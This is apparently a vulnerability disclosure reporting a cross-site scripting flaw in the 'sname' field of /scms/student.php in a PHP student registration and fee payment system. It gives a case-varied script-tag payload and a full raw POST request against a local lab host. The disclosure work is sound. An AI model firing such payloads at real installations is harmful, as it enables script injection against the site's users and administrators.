# student-registration-and-fee-payment-system - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/15355/student-registration-and-fee-payment-system-php-mysql.html

Date: 2022-05-07

Vulnerability File: /scms/student.php

Vulnerability location: /scms/student.php, sname

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST http://192.168.2.102/scms/student.php HTTP/1.1
Host: 192.168.2.102
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.5,zh-HK;q=0.3,en-US;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 175
Origin: http://192.168.2.102
Connection: close
Referer: http://192.168.2.102/scms/student.php?action=edit&id=5
Cookie: PHPSESSID=vpohrtulukshjgjlje1jbeavrj
Upgrade-Insecure-Requests: 1

sname=%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&contact=7566969650&grade=11&joindate=2020-02-14&about=Demo+About+Text&emailid=christinemoore%40gmail.com&id=5&action=update&save=
```

![](https://github.com/mikeccltt/0525/blob/main/student-registration-and-fee-payment-system/xss.gif?raw=true)
